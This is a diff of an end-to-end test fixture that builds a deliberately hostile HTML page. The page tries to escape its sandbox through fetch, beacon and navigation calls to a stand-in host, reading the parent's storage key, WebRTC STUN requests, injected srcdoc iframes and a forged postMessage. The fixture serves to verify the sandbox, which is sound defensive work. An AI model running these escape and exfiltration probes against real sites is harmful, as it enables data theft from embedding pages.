@@ -33,7 +33,7 @@ export const SPAWNED = "Two subagents are on it: notes and scout.";
 
 // E2E_ARTIFACTS (SPEC "Artifacts"): fake pages only. "ui": the first turn publishes LANDING (its
 // input streamed slowly, so the draft shows), the second edits its heading; "hostile": the turn
-// publishes HOSTILE, which tries every way out of its sandbox and writes what happened into #out.
+// publishes hostile(stun), which tries every way out of its sandbox and writes what happened into #out.
 export const ARTIFACT = "trip";
 export const LANDING_HEADING = "Weekend in Lisbon";
 export const EDITED_HEADING = "Long weekend in Lisbon";
@@ -43,14 +43,21 @@ export const LANDING_EDIT = { edits: [{ new: `<h1 id="heading">${EDITED_HEADING}
 export const PUBLISHED = "There is the plan, as a page.";
 export const EDITED = "The heading says long weekend now.";
 
-// every attempt goes to http://outside.test, which e2e/artifacts-security.spec.ts watches for
+// every attempt goes to http://outside.test, which e2e/artifacts-security.spec.ts watches for, but
+// WebRTC's, whose STUN requests go to a UDP listener the test holds on 127.0.0.1:`stun`; a frame of
+// the page's own (a srcdoc frame would have a window with WebRTC in it) must never run
 export const OUTSIDE = "http://outside.test";
-const hostileScript = `
+const hostileScript = (stun: number) => `
 const results={};
 const out=document.getElementById("out");
 const record=(k,v)=>{results[k]=v;out.textContent=JSON.stringify(results)};
 const attempt=async(k,f)=>{try{const r=await f();record(k,"ok:"+String(r).slice(0,60))}catch(e){record(k,"blocked:"+(e&&e.name||"error"))}};
 const failed=(k)=>new Error(k);
+const ice={iceServers:[{urls:"stun:127.0.0.1:${stun}"}]};
+const offer=async(R)=>{const pc=new R(ice);pc.createDataChannel("x");await pc.setLocalDescription(await pc.createOffer());return "offered"};
+const CHILD="<script>parent.postMessage({child:typeof RTCPeerConnection},'*');(async()=>{const pc=new RTCPeerConnection("+JSON.stringify(ice)+");pc.createDataChannel('x');await pc.setLocalDescription(await pc.createOffer())})()<\\/script>";
+let childSaid=null;addEventListener("message",e=>{if(e.data&&"child" in e.data)childSaid=e.data.child});
+const ranAfter=()=>new Promise((res,rej)=>setTimeout(()=>childSaid===null?rej(failed("the frame never ran")):res("child ran: "+childSaid),1500));
 Promise.all([
 attempt("fetch",()=>fetch("${OUTSIDE}/fetch").then(r=>r.status)),
 attempt("xhr",()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open("GET","${OUTSIDE}/xhr");x.onload=()=>res(x.status);x.onerror=()=>rej(failed("xhr"));x.send()})),
@@ -63,11 +70,14 @@ attempt("parentDocument",()=>parent.document.title),
 attempt("parentStorage",()=>parent.localStorage.getItem("app-key")),
 attempt("topLocation",()=>{top.location.href="${OUTSIDE}/top";return "assigned"}),
 attempt("windowOpen",()=>{const w=window.open("${OUTSIDE}/popup");if(!w)throw failed("popup");return "opened"}),
-attempt("rtc",()=>new RTCPeerConnection({iceServers:[{urls:"stun:outside.test:3478"}]})),
-attempt("rtcInFrame",()=>{const f=document.createElement("iframe");document.body.append(f);const R=f.contentWindow.RTCPeerConnection;return new R({iceServers:[{urls:"stun:outside.test:3478"}]})}),
+attempt("rtc",()=>offer(RTCPeerConnection)),
+attempt("srcdocFrame",()=>{const f=document.createElement("iframe");f.srcdoc=CHILD;document.body.append(f);return ranAfter()}),
+attempt("srcdocInHTML",()=>{document.body.insertAdjacentHTML("beforeend","<div><iframe srcdoc='"+CHILD.replaceAll("'","&#39;")+"'></iframe></div>");return ranAfter()}),
+attempt("srcdocInShadow",()=>{const h=document.body.appendChild(document.createElement("div"));const r=h.attachShadow({mode:"closed"});r.innerHTML="<iframe srcdoc='"+CHILD.replaceAll("'","&#39;")+"'></iframe>";return ranAfter()}),
+attempt("framesLeft",()=>new Promise((res,rej)=>setTimeout(()=>{const n=document.querySelectorAll("iframe,frame,object,embed").length+window.length;if(n===0)rej(failed("no frames"));else res(n)},1700))),
 attempt("sendBeacon",()=>{if(!navigator.sendBeacon("${OUTSIDE}/beacon","x"))throw failed("beacon");return "sent"}),
 ]).then(()=>{document.body.dataset.done="yes"});
 document.getElementById("forged").addEventListener("click",()=>parent.postMessage({type:"open",token:"forged",url:"https://example.com/forged"},"*"));
 document.getElementById("selfnav").addEventListener("click",()=>{location.href="${OUTSIDE}/self"});
 `;
-export const HOSTILE = `<!doctype html><html><head><title>Hostile</title></head><body><pre id="out">{}</pre><a id="link" href="https://example.com/opened">a link out</a> <button id="forged">forged open</button> <button id="selfnav">navigate away</button><script>${hostileScript}</script></body></html>`;
+export const hostile = (stun: number) => `<!doctype html><html><head><title>Hostile</title></head><body><pre id="out">{}</pre><a id="link" href="https://example.com/opened">a link out</a> <button id="forged">forged open</button> <button id="selfnav">navigate away</button><script>${hostileScript(stun)}</script></body></html>`;
